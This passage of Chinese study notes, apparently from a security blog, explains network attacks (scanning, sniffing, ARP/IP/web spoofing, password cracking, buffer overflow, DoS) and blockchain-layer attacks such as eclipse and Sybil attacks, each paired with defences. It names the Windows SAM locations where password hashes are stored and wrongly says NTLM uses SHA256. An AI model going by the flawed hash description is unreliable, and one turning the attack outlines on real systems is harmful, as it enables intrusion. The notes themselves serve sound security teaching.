可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。\n\n使用特定的 UDP服务客户端（如 Snmpwalk，dig或Tftp）发送UDP数据包到目标UDP网络服务之后等待确定性的响应信息。\n\n漏洞扫描\n\n​\t漏洞扫描程序的基本原理：具有漏洞的应用程序在对某些网络请求作答时，与已经安装补丁的程序有所差别；利用这些差别可以识别目标主机上的程序是否存在漏洞。\n​\t常用的漏洞扫描工具有Nessus、OpenVAS、X-Scan等\n6.2.2 嗅探技术对攻击者来说，通过嗅探技术能以非常隐蔽的方式攫取网络中的大量敏感信息，与主动扫描相比，嗅探行为更难被察觉，也更容易操作\n嗅探器的作用不正当用途：\n (1) 窃取机密信息，包括各种用户名和口令，电子邮件正文及附件、网络打印的文档等；\n (2) 窥探底层的协议信息，如DNS的IP地址、本机IP地址、网关IP地址等；\n (3) 通过嗅探器获得的数据还可以为攻击者进行中间人攻击篡改数据提供帮助。\n正当用途：\n (1) 解释网络上传输的数据包的含义；\n (2) 为网络诊断提供参考；\n (3) 为网络性能分析提供参考；\n (4) 发现网络入侵现象，为入侵检测提供参考；\n (5) 将网络事件记入日志。\n常见嗅探工具\n•tcpdump嗅探器软件\n 可以将网络中传送的数据包的包头完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。同时也是维护的比较好的开源嗅探器软件，官方网址是http://www.tcpdump.org/。\n•wireshark网络数据包分析工具\n主要作用是捕获网络数据包，并尽可能详细地显示数据包的内容，它使用WinPCAP作为接口，直接与网卡进行数据报文交换， wireshark的官方网址是https://www.wireshark.org/。\n集线器网络\n\n假设机器A上的管理员为了维护机器C，使用了一个FTP命令向机器C进行远程登陆，\n机器B上的管理员想知道究竟登陆机器C上FTP口令，仅仅需要把自己机器上的网卡置于混杂模式，并对接收到的数据帧进行分析。\n交换机网络\n几种在交换网络中实现的嗅探方法：\n•MAC洪泛\n 向交换机发送大量含有虚构的MAC地址和IP地址的包，使交换机无法处理如此多的信息，致使交换机进入了所谓的“打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有机器广播数据包\n•MAC欺骗\n 攻击者通过将源MAC地址伪造为目标主机的源MAC地址，并将这样的数据包通过交换机发送出去，使得交换机不断的更新MAC—端口映射表，从而让交换机相信攻击者主机的MAC就是目标主机的MAC，交换机就会把本应发送给目标主机的数据包发送给攻击者\n•ARP欺骗\n 攻击者通过对网关和目标主机进行ARP欺骗，就可以截获两者之间的通信数据，实现嗅探的目的\n6.2.3 其他信息收集技术利用公开服务收集信息\n WEB与搜索引擎服务、USENET（新闻组服务）、WhoIs服务\n\n网络拓扑探测\n​\t主要方法是路由跟踪，执行路由跟踪的工具是在类UNIX操作系统平台上的traceroute和Windows平台的Tracert客户端程序\n系统类型探测\n\n利用端口扫描。\n利用Banner\nTCP&#x2F;IP协议栈指纹\n\n​\tTCP&#x2F;IP 堆栈指纹识别是对 TCP&#x2F;IP 堆栈实现的特征的远程检测。然后，参数的组合可用于推断远程机器的操作系统（也称为操作系统指纹），或合并到设备指纹中\n6.2.4 关于漏洞与信息收集的防范防范网络扫描：\n•在防火墙及过滤设备上采用严格的过滤规则，禁止扫描的数据包进入系统。\n•主机系统除了必要的网络服务外，禁止其它的网络应用程序。 \n•对于只对内开放的网络服务，更改其提供服务的端口。 \n•抓取扫描时的数据包，对扫描者进行反向追踪。\n防范嗅探：\n•及时打补丁。 \n•开启本机监控。\n•监控本地局域网的数据帧。\n•对敏感数据加密。\n•使用安全的拓扑结构。\n•安装ARP防火墙。\n6.3 网络欺骗6.3.1 IP欺骗以其它主机IP作为源IP向目标主机发送数据包\nIP欺骗的危害：\n以可信任的身份与服务器建立连接和伪造源IP地址，隐藏攻击者身份，消除攻击痕迹\nIP 欺骗的两种表现形式：\n•攻击者伪造的IP地址不可达或者根本不存在。\n•攻击者通过在自己发出的IP 包中填入被目标主机所信任的主机的IP来进行冒充。\nIP欺骗的步骤\n•找到一个被目标主机信任的主机；\n•使被信任的主机丧失工作能力；\n•伪装成被信任的主机, 向目标主机发送SYN；\n•猜测或嗅探得到SYN+ACK的值；\n•再向目标主机发送ACK连接建立\n6.3.2 电子邮件欺骗•电子邮件欺骗（email spoofing）是伪造电子邮件头，导致信息看起来来源于某个人或某个地方，而实际却不是真实的源地址。\n•这种欺骗发生的主要原因是由于发送电子邮件最主要的协议—简单邮件传输协议（SMTP）不包括认证机制。即使SMTP服务扩展允许SMTP客户端通过邮件服务器来商议安全级别。但这一预防措施并不是总被使用。如果预防措施没有被使用，具备必要知识的任何人都可以连接到服务器，并使用其发送邮件\n6.3.3 Web欺骗•攻击者创造了一个表面上看起来完全相同的网站，它拥有相同的网页和链接。然而，攻击者控制着假冒的Web站点，这样被攻击者浏览器和Web服务器之间的所有网络信息完全被攻击者所截获\n•基本原理：在受攻击者和提供真正服务的Web服务器之间设立攻击者的Web服务器，这种攻击种类在安全问题中称为“来自中间的攻击”\n工作流程如下所示：\n\n用户点击经过改写后的 http://www.www.org/http://home.xxx1.com ；\n\nhttp://www.www.org向http://home.xxx1.com 请求文档；\n\nhttp://home.xxx1.com向http://www.www.org 返回文档；\n\nhttp://www.www.org 改写文档中的所有URL；\n\nhttp://www.www.org 向用户返回改写后的文档。\n\n•修改过的文档中的所有URL都指向了www.org ，当用户点击任何一个链接都会直接进入 www.org ，而不会直接进入真正的URL\n\n•开始攻击之前，攻击者必须以某种方式引诱受攻击者进入攻击者所创造的错误的Web。黑客往往使用下面三种方法：\n\n•把错误的Web链接放到一个热门Web站点上； \n\n•如果受攻击者使用基于电子邮件，那么可以将它指向错误的Web； \n\n•创建错误的Web索引，指示给搜索引擎\n\n•构建自己的DNS服务器，IP地址解析到攻击WEB页面，且将攻击WEB页面伪造成被假冒的页面。\n\n\n6.3.4 ARP欺骗（前文嗅探处有提）\n•ARP原理：\n 主机A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会通过交换机进行数据传输。如果未找到，则广播A一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。局域网内所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据。因此，本地高速缓存的这个ARP cache表是本地网络通讯的基础，这个缓存表是动态更新的。\n典型的ARP欺骗分为两种：\n\n对路由器ARP cache表的欺骗\n对内网PC的网关欺骗。\n\n第一种ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器的ARP cache中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。\n第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的网关连接到Internet。从被骗PC角度看，就是上不了网了，“网络掉线了”\nARP欺骗能够得以实现的主要原因有：\n•ARP协议设计之初没有考虑安全问题，所以任何计算机都可以发送虚假的ARP数据包；\n•ARP协议的无状态性，响应数据包和请求数据包之间没有什么关系，如果主机收到一个ARP响应却无法知道是否真的发送过对应的ARP请求；\n•ARP缓存需要定时更新，给攻击者以可乘之机。\n•ARP欺骗的主要环境必须是局域网，也就是说攻击者必须先取得进入局域网的合法身份才能进行ARP欺骗\n网络执法官原理：\n 在网络执法官中，要想限制某台机器上网，只要点击”网卡”菜单中的”权限”，选择指定的网卡号或在用户列表中点击该网卡所在行，从右键菜单中选择”权限”。在弹出的对话框中即可限制该用户的权限。对于未登记网卡，可以这样限定其上线：只要设定好所有已知用户（登记）后，将网卡的默认权限改为禁止上线即可阻止所有未知的网卡上线。使用这两个功能就可限制用户上网。其原理是通过ARP欺骗发给被攻击的电脑一个假的网关IP地址对应的MAC，使其找不到网关真正的MAC地址，这样就可以禁止其上网。\n\n\n6.3.5 非技术类欺骗\n社会工程学\n垃圾搜索\n\n​\t\t•攻击者通过搜索被攻击者的废弃物，得到与攻击系统有关的信息\n6.3.6 关于网络欺骗的防范IP欺骗的防范•抛弃基于地址的信任策略；\n•进行包过滤，只信任内部主机；\n•利用路由器屏蔽掉所有外部希望向内部发出的连接请求；\n•使用加密传输和验证的方法；\n•使用随机化的初始序列号，使得TCP序列号难以猜测。\nWeb欺骗的防范短期的解决方案:\n•禁止浏览器中的javascript功能，那么各类改写信息将原形毕露； \n•确保浏览器的连接状态是可见的，它将给你提供当前位置的各类信息； \n•时刻注意你所点击的URL链接会在位置状态行中得到正确的显示。 \n长期的解决方案:  \n•改变浏览器，使之具有反映真实URL信息的功能，而不会被蒙蔽； \n•对于通过安全连接建立的Web——浏览器对话，浏览器还应该告诉用户谁在另一端，而不只是表明一种安全连接的状态。\nARP欺骗的防范\n•网关建立静态IP&#x2F;MAC对应关系,各主机建立MAC数据库\n•建立DHCP服务器\n•IDS（Intrusion Detection System，入侵检测系统）监听网络安全。\n6.4 口令攻击6.4.1 常见系统口令机制口令的存储：操作系统一般不存储明文口令，只保存口令散列。\n可以在以下几个地方找到windows系统的口令散列：\n 注册表，HKEY_LOCAL_MACHINE\\SAM\\SAM；\n SAM文件，位置在%SystemRoot%system32\\config\\SAM；\n 恢复盘，位置在%SystemRoot%repair\n口令的管理 Windows 系统使用安全账号管理器的机制来管理用户账号。安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识也完全不同。因此，一旦某个账号被删除，他的安全标识也就不存在了。即使重建相同的用户名账号，也会有不同的安全标识，不会保留原来的权限。\nWindows使用两种算法来处理明文口令，即LM算法和NTLM算法。\n•1) LM算法，口令转换为hash值，方法如下：\n (1) 口令变成大写；\n (2) 把口令变成14个字符，或截断或补齐；\n (3) 这14个字符分成两个7字符；\n (4) 用7个字符和DES算法加密一个64位“Magic ”；\n (5) 把两个64位结果拼起来，得到128位值；\n (6) 服务器保存该128位值\n•2) NTLM算法，口令转换为hash值，方法如下：\n (1) 把口令变成Unicode编码；\n (2) 使用SHA256散列算法；\n (3) 保存得到的128位散列值\n6.4.2 口令攻击技术根据攻击口令是否以网络连接的交互方式进行，可以将攻击分为在线口令攻击和离线口令攻击：\n\n在线口令攻击：在线攻击是指在线状态下攻击者对用户口令进行的猜测试探攻击；\n离线攻击：离线攻击是指攻击者通过某些手段进行任意多数量的口令猜测，采用攻击字典和攻击程序，最终获得口令。离线攻击方法是Internet上常用的攻击手段。\n\n根据攻击手段是否参与实际的身份认证过程，可以将攻击分为主动口令攻击和被动口令攻击：\n\n主动口令攻击又可以分为以下三种形式：\n\n\n•字典攻击：字典攻击是一种把常见的、使用概率较高的口令集中存放在字典文件中，利用字典库中的数据不断的进行用户名和口令的反复测试。缺点是只能发现字典里存在的单词口令。\n•强力攻击：尝试所有的字符组合方式，逐一去模拟口令验证过程，缺点是速度慢。\n•组合攻击：综合了以上两种方法，这种攻击介于字典攻击和强力攻击之间。\n\n\n被动口令攻击又可以分为以下三种形式：\n\n\n•网络数据流窃听：由于认证信息要通过网络传递，且很多认证系统的口令是未经加密的明文，攻击者通过窃听网络数据，就很容易分辨出某种特定系统的认证数据，并提取出用户名和口令。\n•重放(Record&#x2F;Replay)：有的系统会将认证信息进行简单加密后进行传输，如果攻击者无法用第一种方式推算出口令，可以使用截取&#x2F;重放方式。攻击者仍可以采用离线方式对口令密文实施字典攻击；\n•钓鱼攻击\n\n口令技术的缺点：\n•大多数系统的口令是明文传送到验证服务器的，容易被截获。某些系统在建立一个加密链路后再进行口令的传输以解决此问题，如配置链路加密机。 \n•口令维护的成本较高。为保证安全性，口令应当经常更换。另外为避免对口令的字典攻击，口令应当保证一定的长度，并且尽量采用随机的字符。但缺点是难于记忆。\n•口令容易在输入的时候被攻击者偷窥，而且用户无法及时发现。\n6.4.3 关于口令攻击的防范\n选择安全密码\n\n\n设置足够长度的口令\n口令中混合使用大小写字母、数字、特殊符号\n\n\n防止口令猜测攻击\n\n\n硬盘分区采用NTFS格式\n正确设置和管理帐户\n禁止不需要的服务\n关闭不用的端口\n禁止建立空连接\n\n\n设置安全策略\n\n\n强制密码历史。确定唯一新密码的个数，在重新使用旧密码之前，用户必须使用这些密码。\n密码最长使用期限。确定在要求用户更改密码之前用户可以使用该密码的天数。其值介于 0 和 999 之间；如果该值设置为 0，则密码从不过期。\n密码最短使用期限。确定用户可以更改新密码之前这些新密码必须保留的天数。此设置被设计为与“强制密码历史”设置一起使用，这样用户就不能很快地重置有次数要求的密码并更改回旧密码。\n密码长度最小值。确定密码最少可以有多少个字符。\n\n\n采用加密的通信协议。\n\n 比如在使用web邮箱时，可以采用更加安全的https。\n\n使用U盾输入口令，降低键盘记录攻击的威胁。\n\n  另外，访问网站时，注意区分是否是虚假站点。\n6.5 缓冲区溢出攻击6.5.1 缓冲区溢出的概念缓冲区：\n 从程序的角度，缓冲区就是应用程序用来保存用户输入数据和代码的临时数据的内存空间。\n缓冲区溢出：\n 如果用户输入的数据长度超出了程序为其分配的内存空间，这些数据就会覆盖程序为其它数据分配的内存空间，形成所谓的缓冲区溢出。\n缓冲区溢出的危害：\n 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统和应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统当机和重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。\n6.5.2 缓冲区溢出的基本原理缓冲溢出通常在程序缓冲区编写超出其长度的代码——造成溢出，从而破坏其堆栈，使程序执行攻击者在程序地址空间中早已安排好的代码以达到其目的。\n由于name只有8字节大小，在进行strcpy前，并没有检测argv[1]的长度，如果argv[1]的长度大于8，则复制时就会覆盖name数组后面的ebp的内容及main函数的返回地址。等函数返回时，程序就会跳转到修改后的地址去执行。\n几种实现缓冲区攻击的方法\n 在程序的地址空间里安排适当的代码\n\n•植入法。\n•利用已经存在的代码。\n\n 通过适当的初始化寄存器和内存，让程序跳转到攻击者安排的地址空间执行\n\n•通过Activation Records（活动记录）改变地址\n•通过Function Pointers（函数指针）改变地址\n•通过Longjmpbuffers（长跳转缓冲区）改变地址\n\n6.5.3 缓冲区溢出的类型按照溢出缓冲区所在的区域类型来划分，可分为栈溢出和堆溢出\n•栈溢出特点：缓冲区在栈中分配；拷贝的数据过长；覆盖了函数的返回地址、其它一些重要数据结构或函数指针\n•堆溢出特点：缓冲区在堆中分配；拷贝的数据过长；覆盖了堆管理结构\n•其他溢出类型中，最典型的就是整型溢出\n•整型数溢出从造成溢出原因的角度来说可以分为三大类：存储溢出、计算溢出和符号问题\n6.5.4 缓冲区溢出的防范对缓冲区溢出的防范方法主要有以下几种方式：\n 编写严格的代码\n 不可执行堆栈数据段\n 利用程序编译器的边界检查\n 指针完整性检查\n6.6 拒绝服务攻击6.6.1 拒绝服务攻击的概念服务：\n 是指系统提供的，用户需求的一些功能。\n拒绝服务（DoS）：\n DoS是Denial of Service的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。例如一个计算机系统崩溃或其带宽耗尽或其硬盘被填满，导致其不能提供正常的服务，就构成拒绝服务。\n拒绝服务攻击：\n 造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。\n分布式拒绝服务（DDoS）攻击：\n 如果处于不同位置的多个攻击者同时向一个或数个目标发起攻击，或者一个或多个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击\n6.6.2 利用系统漏洞进行拒绝服务攻击•系统漏洞是包含在操作系统或应用程序中与安全相关的系统缺陷。这些缺陷大多是由于错误的编程、粗心的源代码审核或一些不当的绑定所造成的，常被攻击者利用\n 例如微软的Windows 操作系统中的安全漏洞允许rootkits在使用操作系统的计算机上隐藏起来或者实施拒绝服务器攻击\n Windows GDI Plus library存在处理畸形图象漏洞，可能引起远程拒绝服务\n•解决这类攻击方法只能是不停的修复漏洞，同时加强管理人员对这类问题的重视程度\n6.6.3 利用协议漏洞进行拒绝服务攻击•几个典型的利用协议漏洞进行的拒绝服务攻击：\n SYN Flood\n UDP flood拒绝服务攻击\n Land攻击\n   这是利用漏洞，进行发送大量的源地址与目的地址相同的包，从而造成服务器解析Land包时占用大量的处理资源，当收到的包达到一定程度时，就会形成拒绝服务攻击。\n 死Ping\n   Ping是通过发送ICMP报文来判断主机是否存活。利用这个命令就能发动一次攻击，当发送超大型这种包时，也就是发送的包超过65535字节会造成服务器重组包时发生缓冲区溢出，从而让服务器崩溃发生拒绝服务。\n6.6.4 对拒绝服务攻击的防范\n•确保所有服务器采用最新系统，并打上安全补丁\n•删除多余的网络服务\n•自己定制防火墙规则\n•确保从服务器相应的目录或文件数据库中删除未使用的服务\n•禁止内部网通过Modem连接至PSTN系统\n•禁止使用网络访问程序如Telnet、Ftp、Rsh、Rlogin和Rcp，以基于PKI的访问程序如SSH取代\n\n​\t\t\t（ps: rsh是”remote shell”(远程 shell)的缩写，该命令在指定的远程主机上启动一个shell并执行用户在rsh命令行中指定的命令;如果用户没有给出要执行的命令，rsh就用rlogin命令使用户登录到远程机上。\n​\t\t\tremote file copy，即远程文件拷贝)\n\n•限制在防火墙外与网络文件共享\n•在防火墙上运行端口映射程序或端口扫描程序\n•检查所有网络设备和主机&#x2F;服务器系统的日志\n•确保管理员对所有主机进行检查，而不仅针对关键主机\n\n","url":"2024/11/10/链安基础2/","date":"2024-11-10"},{"title":"区块链安全基础四","content":"八.区块链攻击与防御安全威胁分析\n自身结构的复杂性和应用场景的多样性\n恶意攻击者可能针对区块链应用的底层技术缺陷、低耦合性等安全漏洞展开攻击，从而非法攫取利益。\n\n分类：\n\n分类数据层威胁数据层、网络层和共识层是区块链技术体系中最基础、最必要的3个层级，而数据层是其中最重要的一层，主要涉及区块链的数据结构、数字签名、哈希函数等密码学工具。这些密码学工具在保护区块链数据隐私的同时，其固有的碰撞攻击、后门攻击等安全问题也给区块链数据隐私带来了一定威胁。此外，攻击者也可能通过交易延展性攻击和恶意信息攻击破坏交易秩序和区块链网络环境。因此，区块链数据层面临的安全威胁主要包含数据隐私窃取和恶意数据攻击。\n原因：区块链的数据层主要负责底层数据的存储，包括交易信息、区块头等关键数据。由于区块链的不可篡改性，一旦数据被写入，修改这些数据是极其困难的。然而，如果攻击者在数据层植入恶意信息或成功篡改已有数据，可能会对整个链的安全性造成威胁。\n类型：常见的数据层攻击包括51%攻击，通过控制大多数计算力来重写区块链历史；以及时间戳攻击，即通过操纵时间戳来影响区块的产生。\n\n密码算法的安全风险：如果使用的是低安全强度的密码算法，或者密码算法实现存在错误，那么区块链系统将容易受到攻击，导致数据被篡改或泄露。\n\n数据结构逻辑错误：区块链的数据结构如果设计不合理，比如交易数据的树状组织不当，可能会导致解析错误，从而影响整个系统的稳定性和安全性。\n\n数据隐私窃取：由于区块链的透明性特点，所有交易数据都是公开的，这可能导致用户隐私信息的泄露。因此，如何保护用户的隐私成为了一个重要的安全问题。\n\n恶意数据攻击：区块链数据层可能会遭受恶意数据的注入，这些数据可能是为了破坏区块链的正常运行或者是企图篡改历史记录。\n\n硬件安全：区块链系统通常依赖于特定的硬件环境，如果硬件存在安全漏洞，比如固件中的后门或硬件设备的物理损坏，也会影响到数据层的安全。\n\n\n采取有效的防御措施至关重要。例如，采用高强度的密码算法、确保数据结构的合理性和加强数据隐私保护措施\n网络层威胁   网络层是区块链技术体系中最基础的层级，主要包含P2P网络组网方式、消息传播协议等模块，赋予了区块链去中心化、不可删除、不可篡改的技术特性。区块链网络层面临的安全威胁主要是针对P2P网络的恶意攻击，攻击者可能通过漏洞植入、路由劫持、资源占用等方式扰乱区块链网络的正常运行，也有可能利用交易延迟攻击来破坏区块链网络交易环境。\n原因：网络层负责节点间的通信和数据传输。如果攻击者能够控制或干扰节点之间的通信，那么他们可以发起拒绝服务攻击（DoS），或者更隐蔽地修改传输中的数据，从而污染整个网络的信息。\n类型：网络层的攻击包括日蚀攻击，即隔离某些节点使其只与攻击者控制的节点通信；以及路由攻击，攻击者破坏或操纵网络的路由表来干扰数据传输。\n共识层威胁   共识层是区块链技术体系的核心架构。\n其中的共识算法可以保证全网节点在去信任化的场景中对分布式账本数据达成共识，为区块链的去中心化、信任化提供了保障。\n在授权共识机制中，各节点对共识过程的影响相同，所以易遭受女巫攻击；而在非授权共识机制中，各对等节点利用自身所持资源（如算力、权益）竞争记账权，进而达成共识。\n投入的资源越多，则成功率越高，因此易遭受51%攻击。攻击者可能出于利益目的，通过贿赂攻击、币龄累计攻击等方式非法获取大量资源，从而发起51%攻击，以实现代币双花、历史修复、期货卖空、自私挖矿等目的。此外，攻击者还可以通过无利害关系攻击、预计算攻击等方式影响全网共识进程，进而获利。\n共识层面临的安全威胁主要是，攻击者可以通过各种手段阻止全网节点达成正确的共识。\n原因：共识层是区块链设计中的核心部分，它确保所有节点同意一份相同的数据记录。这一层的安全问题通常涉及操纵共识机制以达到非法获利或破坏系统的目的。\n类型：自私挖矿是一种共识层的攻击方式，攻击者私下挖掘区块并隐瞒，直到能够获得比诚实节点更长的链时再公布，从而实现双花攻击。\n\n关于女巫攻击   Sybil攻击，又称为女巫攻击，指一个恶意节点非法的对外呈现多个身份，通常把该结点的这些身份称为Sybil结点。Sybil攻击方式有以下几种类型：直接通信、间接通信、伪造身份、盗用身份、同时攻击、非同时攻击。\n​\t在区块链网络中，用户创建新身份或新节点是不需要代价的，攻击者利用这一漏洞发动Sybil攻击，伪造自己的身份加入网络，在掌握了若干节点或节点身份之后，随意做出一些恶意的行为。例如降低区块链网络节点的查找效率；或者网络中传输非授权文件、破坏文件共享安全、消耗节点间的连接资源等。\n\n关于Eclipse攻击Eclipse攻击是指攻击者通过侵占节点的路由表，将足够多的虚假节点添加到某些节点的邻居节点集合中，从而将这些节点“隔离”于正常区块链网络之外。\n   当节点受到Eclipse攻击时，节点的大部分对外联系都会被恶意节点所控制，由此恶意节点得以进一步实施路由欺骗、存储污染、拒绝服务以及ID劫持等攻击行为。Eclipse攻击原理如图所示：\n\nEclipse攻击者不断的向区块链节点发送路由表更新信息来影响区块链节点的路由表，使普通节点的路由表充满虚假节点。当区块链节点的路由表虚假节点占较高比例时，它对区块链网络的正常行为（如路由查找、资源搜索）都会被恶意节点所隔绝。\nEclipse攻击和Sybil攻击密切相关，它需要较多的Sybil攻击节点相配合。为了实现对特定区块链节点群的Eclipse攻击，攻击者需要先设置足够多的Sybil攻击节点，并向区块链网络宣称他们是“正常节点”，然后利用这些Sybil节点和正常的节点通信，入侵其路由表，最终把他们从区块链网络中隔离出去。\n   Eclipse攻击破坏了区块链网络的拓扑结构，减少了节点数目，使区块链网络资源共享的效率大大降低，极端情况下，它可以控制整个网络，将其分割成若干个区块链网络区域。对受害节点来说，它在未知情况下脱离区块链网络，所有区块链网络请求消息都会被攻击者劫持。\n\n合约层攻击合约层是区块链实现点对点可信交互的重要保障，主要包括智能合约的各类脚本代码、算法机制等，是区块链2.0的重要标志。合约层面临的安全威胁可以分为智能合约漏洞和合约虚拟机（EVM）漏洞：智能合约漏洞通常是由开发者的不规范编程或攻击者恶意漏洞植入导致的，而合约虚拟机漏洞则是由不合理的代码应用和设计导致的。\n首先是智能合约编程导致的漏洞，这类漏洞通常是由于开发者在编写智能合约时的不规范编程或者疏忽导致的；其次是合约虚拟机漏洞，合约虚拟机（Ethereum Virtual Machine，EVM）是以太坊上智能合约运行的环境，如果EVM存在漏洞，那么所有运行在该环境上的智能合约都可能受到影响。\n类型：重入攻击（reentrancy attack）或者前置运行攻击（front-running attack）用于破坏合约的正常执行或者盗取资产；DAO攻击就是利用当时以太坊智能合约和EVM中的递归调用漏洞来实现的。\n应用层威胁应用层是区块链技术的应用载体，为各种业务场景提供解决方案，可分为记账和区块链交易两类场景。（应用层是用户与区块链系统交互的层面，包括智能合约和去中心化应用（Decentralized Applications，DApps）。智能合约的代码如果有漏洞，就可能成为攻击的目标）\n   在记账场景中，攻击者可能通过漏洞植入、网络渗透、地址篡改等方式攻击记账系统，从而非法获利；“聪明”的记账系统也可能利用记账机制的漏洞，通过算力伪造攻击、扣块攻击、丢弃攻击等方式谋求最大化的收益。\n​    在区块链交易场景中，攻击者可能利用撞库攻击、0day漏洞、API接口攻击等方式非法获取交易平台中用户的隐私信息，也可能通过钓鱼攻击、木马劫持攻击等方式获取用户账户的隐私和资产。\n类型：智能合约漏洞利用是一种常见的应用层攻击，攻击者通过调用存在缺陷的智能合约来盗取资产或破坏应用逻辑。\n小结   在实际的区块链攻击场景中，攻击者发起攻击旨在非法获取最大化的利益，但并不是所有的区块链攻击方式都可以使攻击者直接获利。此外，部分区块链攻击对实施场景和条件要求过高，使得其可行性受到了严重的制约。因此，攻击者通常采用一系列跨层级的区块链攻击方式来实现最大化的获利目的，这种攻击序列为攻击簇。\n   例如：现实场景中，攻击者利用自身资源发起51%攻击是不现实的，所以他们可能通过傀儡记账、贿赂攻击、币龄累计攻击等方式非法获取记账权竞争资源，然后发起51%攻击，进而实现双花攻击、历史修复攻击、卖空攻击等。显然，研究区块链安全态势，不仅要从层级分类的横向维度对单个攻击展开分析，还要从攻击关联分析的纵向维度对跨层级的攻击簇进行研究，才有可能构建出全面有效的区块链安全防御体系。\n攻击类型分析网络层攻击类型分析   网络层是区块链技术体系中最基础的技术架构，封装了区块链系统的组网方式、消息传播协议和数据验证机制等要素，使区块链具备了去中心化、不可篡改的技术特性。\n   区块链网络是由P2P网络构建，P2P网络主要涉及用户客户端和对等网络结构，P2P网络的攻击可能针对这两个方面展开如下攻击：\n（1）客户端漏洞（client vulnerability）： 尽管现有全节点客户端的底层协议互相兼容，增强了比特币网络的健壮性，但客户端代码中可能存在诸多安全漏洞，并且这些漏洞会随着客户端类型的增加而增加 。攻击者可以利用0day漏洞扫描等技术扫描客户端中存在的漏洞，然后利用这些漏洞发起各种攻击。2018年，区块链安全公司Peck Shield披露了一个安全漏洞，攻击者可以向以太坊客户端发送特定恶意报文，导致2&#x2F;3的以太坊节点下线。\n（2）窃听攻击（eavesdropping attack）：攻击者可以通过网络窃听，获取区块链用户节点的网络标识，并将其与IP地址关联起来，进而获取用户节点的隐私信息，甚至可以追溯到用户的实际家庭地址。以比特币为例，用户通过连接一组服务器来加入比特币网络，这个初始连接集合就是该用户的唯一入口节点。攻击者可以通过与比特币服务器建立多个连接，以窃听客户端与服务器端的初始连接，获得客户端的IP地址。随着交易流经网络，攻击者将窃听得到的IP地址与已有的客户端入口节点进行匹配，若成功，则攻击者便可获知交易的来源。\n（3）日蚀攻击（eclipse attack）：攻击者通过特定手段使得目标节点只能获得被操纵的、伪造的网络视图，将其从实际的网络视图中隔离出来，从而妨碍目标节点正常运转，以达成特定的攻击目的。攻击者操纵多个对等节点与目标节点保持长时间的传输连接，使其在线链接数达到目标节点的入站连接上限，从而阻止其他合法节点的连接请求。此时，目标节点被攻击者从P2P网络中“隔离”出来，导致目标节点无法正常维护区块链账本。\n 日蚀攻击的实施方法如下：\n\n攻击者可以通过某种方法把正常的比特币节点的输出连接都连接到攻击者控制的恶意节点，同时比特币节点的输入连接都被恶意节点连满。那如何做到让正常的比特币节点都连接到恶意的节点呢？在比特币节点中有两张表，一张叫作NewTable，用来保持当前节点所感知到的网络中其他节点的地址；另一张叫作TriedTable，用于保存曾经连接过的节点。 比特币节点每次建立输出连接的，都是在这两张表中选择一个时间戳较新的节点连接。通过控制僵尸网络不断地去连接这个比特币节点，即可达到刷新这两张表的目的，使得这两张表保存了大量的恶意节点的地址信息。\n\n攻击者再通过DDoS攻击等方法，让这个比特币节点重启。这样这个比特币节点连到的就都是攻击者控制的恶意节点了。\n\n边界网关协议（border gateway protocol，简称BGP）劫持攻击：BGP是因特网的关键组成部分，攻击者可以通过劫持BGP来实现操纵互联网路由路径的目的。由于区块链是基于互联网来传递信息的，劫持BGP可以实现对区块链节点流量的误导和拦截。攻击者一旦接管了节点的流量，就可以通过影响区块链网络的正常运行来破坏共识和交易进程。例如，比特币系统的大部分节点都被托管至几个特定的互联网服务提供商，大约60%的比特币连接都会通过这些特定服务商，所以攻击者一旦接管了这部分流量，将可以通过BGP路由劫持破坏区块链网络的完整性，甚至导致区块链网络瘫痪。\n\n分割攻击（segmentation attack）：攻击者通过BGP劫持攻击将区块链网络划分成两个或多个不相交的网络，此时的区块链会分叉为两条或多条并行支链。攻击者可以在多个支链网络中将同一笔电子货币兑换成现实商品或法币。BGP劫持攻击停止后，区块链重新统一，以最长的链为主链，其他的链上的交易、奖励等全部失效，攻击者由此获利。\n\nDoS攻击（denial-of-service attack）：即拒绝服务攻击，攻击者利用大量网络资源攻击计算机系统或网络，使其停止响应甚至崩溃，从而拒绝服务。实际中，用户节点资源通常受限，攻击者只能通过分布式DoS攻击（distributed denial-of-service，简称DDoS）整合零散网络带宽来实施DoS攻击。2017年5月，Poloniex交易平台遭受了严重的DDoS攻击，导致比特币价格被锁定在1761美元，用户无法正常执行交易。此外，当区块链网络中的大部分矿工无法盈利时，可能通过拒绝为区块链网络服务而发起BDoS攻击（blockchain denial of service，简称BDoS），导致区块链网络瘫痪。\n\n交易延迟攻击（transaction delay attack）：比特币闪电网络（lightning network）通常使用哈希时间锁定技术来实现安全的资产原子交换，其安全性主要依赖于时间锁定和资金锁定。由于每一笔资金交换都需要通过时间锁定来规定该交易必须在某个时间段内完成。一些恶意节点短时间内建立大量交易，然后故意超时发送，致使网络发生阻塞，影响正常运作。\n 